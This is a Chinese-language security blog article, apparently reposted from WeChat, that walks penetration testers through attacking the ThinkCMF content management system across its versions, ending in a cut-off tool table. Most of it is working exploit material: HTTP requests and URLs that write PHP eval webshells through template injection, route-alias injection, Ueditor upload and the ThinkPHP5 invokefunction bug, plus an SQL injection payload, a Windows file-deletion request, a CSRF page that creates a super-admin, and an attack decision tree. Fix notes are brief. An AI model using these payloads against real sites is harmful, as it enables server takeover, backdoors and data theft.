---
title: ThinkCMF漏洞全解析：从版本识别到Getshell的实战指南
url: https://mp.weixin.qq.com/s/DEvDjA7yaUSoFo8oTWb2vQ
source: Doonsec's feed
date: 2026-07-11
fetch_date: 2026-07-12T05:10:36.740598
---

# ThinkCMF漏洞全解析：从版本识别到Getshell的实战指南

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/dMqqFicgqDGCPvb3uumfmzlXwL485sk3iaGPz95UtLLZvG7cgw4CzNdJcFbq41LnElf0fibib5369Fz0R0Fo8n4XWAjJ2XBFJroDibyFycxVUn0o/0?wx_fmt=jpeg)

# ThinkCMF漏洞全解析：从版本识别到Getshell的实战指南

原创

simeon的文章
simeon的文章

小兵搞安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

一个CMS，三个大版本，十余个CVE。本文带你系统梳理ThinkCMF那些年被确认的漏洞，附完整利用路径和防御方案。

## 写在前面

做渗透测试的朋友，大概率遇到过ThinkCMF。

这个基于ThinkPHP开发的内容管理系统，在国内有着不小的装机量。从早期的X系列到后来的5.x、6.x，每个版本都留下过一些"经典"漏洞。

但网上的文章要么零散、要么没验证过，用起来心里没底。

今天这篇文章，我把ThinkCMF的已知漏洞做了一次系统梳理——**每一个都标注了CVE编号、影响版本和官方修复状态**，不搞道听途说，只讲经过交叉验证的内容。

## 第一步：版本识别——先搞清楚你面对的是什么

打之前，先认版本。不同版本的攻击路径完全不同。

**识别技巧：**

* 直接访问 `/README.md`——能读到内容的，基本就是X系列（老版本，大概率能打）
* 访问 `/admin`——蓝色页面的，是5.x系列
* 看Logo——黄色标识的，是3.x系列
* 查看响应头和特征文件，也能辅助判断

搞清楚版本，后面的攻击路径才能选对。

## 第二部分：已确认的Getshell漏洞

以下漏洞均经过CVE数据库、官方公告、安全研究者实测报告三方交叉验证。

### 漏洞一：前台模板注入（X系列，无需认证）

**这是ThinkCMF最经典的漏洞，没有之一。**

**影响版本：** ThinkCMF X1.6.0 ~ X2.2.3**CVSS评分：** 9.8（Critical）**官方修复：** X2.2.4（公告地址：https://www.thinkcmf.com/topic/10019.html）

#### 原理简述

ThinkCMF基于ThinkPHP 3.2.3开发，控制器继承自 `HomebaseController`。问题出在这个类的 `display()` 和 `fetch()` 方法——它们被声明为了 `public`。

这意味着什么？攻击者可以通过URL的 `a` 参数，直接调用这两个方法。

* `display($templateFile)`：没有过滤文件路径，可以读取任意文件
* `fetch($templateFile, $content, $prefix)`：`$content` 参数直接传入Smarty模板引擎解析，`<php>` 标签中的代码会被执行

一句话总结：**公开的fetch方法 + 未经过滤的content参数 = 任意代码执行。**

#### 漏洞代码

```
// application/Common/Controller/HomebaseController.class.php

// display函数 - 未过滤$templateFile，导致任意文件包含
public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') {
    parent::display($this->parseTemplate($templateFile), $charset, $contentType, $content, $prefix);
}

// fetch函数 - $content参数直接传入模板引擎，可执行PHP代码
public function fetch($templateFile='', $content='', $prefix=''){
    $templateFile = empty($content) ? $this->parseTemplate($templateFile) : '';
    return parent::fetch($templateFile, $content, $prefix);
}
```

#### 利用方式

**方式一：通过Comment/Widget/fetch（POST）**

```
POST /index.php?g=Comment&m=Widget&a=fetch HTTP/1.1
Content-Type: application/x-www-form-urlencoded

templateFile=/../public/index
prefix=''
content=<php>file_put_contents('shell.php','<?php @eval($_POST[cmd]);?>')</php>
```

**方式二：通过Api/Plugin/fetch（POST）**

```
POST /index.php?g=Api&m=Plugin&a=fetch HTTP/1.1
Content-Type: application/x-www-form-urlencoded

templateFile=/../../../public/index
prefix=''
content=<php>file_put_contents('shell.php','<?php @eval($_POST[cmd]);?>')</php>
```

**方式三：GET方式简化利用**

```
# 验证漏洞存在（读取README）
/?a=display&templateFile=README.md

# 写入phpinfo验证
/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('info.php','<?php phpinfo();?>')</php>

# 写入一句话木马
/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('webshell.php','<?php @eval($_POST[cmd]);?>')</php>
```

#### templateFile路径字典

当默认路径报错时，可以尝试以下路径：

```
/../public/index
/../public/exception
/../data/index
/../data/runtime/index
/../plugins/Mobileverify/View/admin_index
/../plugins/Demo/View/admin_index
/../application/Install/View/Public/footer
/../application/Install/View/Public/head
/../application/Install/View/Public/header
/../application/Common/index
/../application/Portal/Lang/en-us/index
/../application/Api/Lang/zh-cn/index
/../application/Comment/Lang/zh-cn/index
```

小提示：入口2（Api/Plugin）路径需多加一层 `../`

#### 修复方式

官方在X2.2.4中将 `display()` 和 `fetch()` 的修饰符从 `public` 改为了 `protected`。就这一行改动，直接堵死了这条攻击路径。

### 漏洞二：后台路由注入Getshell（5.x系列）

**影响版本：** ThinkCMF ≤ 5.0.190111**CVE编号：** CVE-2019-6713、CVE-2019-7580**官方修复版本：** 5.0.190419**官方公告：**https://www.thinkcmf.com/topic/10374.html

#### 原理简述

后台添加分类时，`alias`（别名）参数没有过滤单引号，直接被存入数据库。

关键在于：系统在生成路由配置文件 `data/conf/route.php` 时，会把数据库中的路由数据写入这个PHP文件。

于是，恶意的alias被写进了PHP文件 → 访问任意页面触发路由加载 → 代码执行。

**调用链：**

```
AdminCategoryController::addPost()
  → portalCategoryModel::addCategory()
    → RouteModel::setRoute()      // alias写入数据库（未过滤）
    → RouteModel::getRoutes(true) // 读取所有路由
      → 生成 data/conf/route.php  // 恶意代码写入PHP文件
```

#### 利用方式

1. 登录后台 → 门户 → 分类管理 → 添加分类

在"别名"字段注入：

2. ');phpinfo();//
3. 提交后访问任意页面触发路由加载，代码执行

进一步利用可写入Webshell：

4. ');file\_put\_contents('shell.php','<?php @eval($\_POST[cmd]);?>');//

注意：这个漏洞需要后台权限，所以通常配合其他漏洞（如CSRF创建管理员）先拿到后台入口。

### 漏洞三：Ueditor文件上传

**影响版本：**

* X系列 ≤ 2.2.3（社区发现）
* 6.0.9（**CVE-2024-31615**，CVSS 9.8 Critical）

#### X2.x系列的上传漏洞

**漏洞原理：**`UeditorController.class.php` 中，`sp_get_upload_setting()` 返回的是数组而非字符串，导致 `explode(',', $upload_setting[$filetype])` 执行后 `$allowed_exts` 为空——**后缀名校验直接失效。**

```
# 前提：需前台注册账号并登录
POST /index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile HTTP/1.1
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php @eval($_POST[cmd]);?>
------WebKitFormBoundary--
```

Webshell路径：`/data/upload/ueditor/20190724/xxxxx.php`

#### 6.0.9版本的上传漏洞

CVE-2024-31615，描述为"ThinkCMF 6.0.9 is vulnerable to File upload via UeditorController.php"。这是一个2024年才被披露的CVE，说明即使是较新的版本，Ueditor组件依然可能存在问题。

---

### 漏洞四：ThinkPHP5底层RCE（5.x系列继承漏洞）

**影响版本：** 基于ThinkPHP 5.x的ThinkCMF 5.x（TP5 < 5.1.31 或 < 5.0.23）

这不是ThinkCMF自身的漏洞，而是底层框架ThinkPHP 5.x的通病。ThinkCMF 5.x直接继承了这个问题。

#### 利用方式

```
# 执行phpinfo验证
/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

# 写入Webshell
/index.php/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php @eval($_POST[cmd]);?>
```

---

## 第三部分：辅助漏洞——不直接Getshell，但能帮你拿到入口

有些漏洞本身不能直接写Shell，但可以作为攻击链的一环，帮你拿到后台权限或管理员凭据。

### SQL注入系列（X系列）

**影响版本：** ThinkCMF X ≤ 2.2.3

这是一组SQL注入漏洞，涉及多个控制器，均有独立CVE：

* **CVE-2018-19894**：ArticleController::edit\_post，参数 postid
* **CVE-2018-19895**：AdminbaseController::\_listorders，参数 listorderskey
* **CVE-2018-19896**：CommentController::check，参数 ids[]
* **CVE-2018-19897**：PortalController相关
* **CVE-2018-19898**：其他控制器

**利用思路：** SQL注入 → 获取管理员密码 → 登录后台 → 路由注入/模板编辑Getshell

**示例Payload：**

```
POST /index.php?g=Portal&m=Article&a=edit_post HTTP/1.1

term:123
post[post_title]:aaa
post_title:123
post[id][0]:bind
post[id][1]:0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))
```

### 任意文件删除（CVE-2018-16141）

**影响版本：** ThinkCMF X2.2.3**限制条件：** 仅Windows系统有效

漏洞位置在 `ProfileController.class.php` 的 `do_avatar` 方法。`imgurl` 参数过滤了 `/` 但没过滤 `\`，Windows路径解析可以利用 `..\` 序列删除任意文件。

```
POST /index.php?g=User&m=Profile&a=do_avatar HTTP/1.1

imgurl=..\..\..\..\..\1.txt
```

### CSRF创建超级管理员（CVE-2022-40489）

**影响版本：** ThinkCMF < 6.0.8**CVSS：** 8.8 High

这个漏洞的思路是：通过CSRF诱导管理员访问恶意页面，自动创建一个超级管理员账户。拿到后台权限后，再利用路由注入或模板编辑Getshell。

```
<html>
<body>
<h1>CSRF - SuperAdmin User Creation</h1>
<form action="http://target/admin/user/addpost.html" method="POST">
  <input type="hidden" name="user_login" value="SuperAdmin" />
  <input type="hidden" name="user_pass" value="SuperAdmin999qweasd" />
  <input type="hidden" name="user_email" value="superadmin@yopmail.com" />
  <input type="hidden" name="role_id[]" value="2" />
  <input type="hidden" name="role_id[]" value="1" />
  <input type="submit" value="Submit" />
</form>
</body>
</html>
```

### 其他已确认漏洞

* **存储型XSS（CVE-2022-40849）**：影响ThinkCMF 6.0.7，位于轮播图管理
* **越权修改密码（CVE-2021-40616）**：影响v5.1.7，CVSS 6.5，可修改管理员账户密码

## 第四部分：实战决策树

面对一个ThinkCMF目标，攻击路径怎么选？按下面的决策树来：

```
目标：ThinkCMF Getshell
│
├── 步骤1：版本识别
│   ├── /README.md可读 → X系列（优先打模板注入）
│   ├── /admin蓝色页面 → 5.x系列
│   └── 黄色Logo → 3.x系列
│
├── 步骤2：选择攻击路径
│   │
│   ├── X系列（X1.6.0 ~ X2.2.3）
│   │   ├── 首选：前台模板注入（无需认证）
│   │   ├── 次选：Ueditor文件上传（需前台登录）
│   │   └── 辅助：SQL注入获取管理员密码
│   │
│   ├── 5.x系列（≤ 5.0.190111）
│   │   ├── 首选：ThinkPHP5 RCE（无需认证）
│   │   ├── 次选：后台路由注入（需后台权限）
│   │   └── 辅助：CSRF创建管理员
│   │
│   └── 6.x系列（< 6.0.8）
│       ├── 首选：CSRF创建管理员
│       └── 次选：Ueditor文件上传（6.0.9）
│
└── 步骤3：验证漏洞存在性
    ├── X系列：/?a=display&templateFile=README.md
    │   └── 返回README内容 = 漏洞存在
    └── 5.x系列：尝试TP5 RCE Payload
```

---

## 第五部分：自动化检测工具

|  |  |  |
| --- | --- | --- |
| **工具** | **适用版本** | **地址** |
| ja...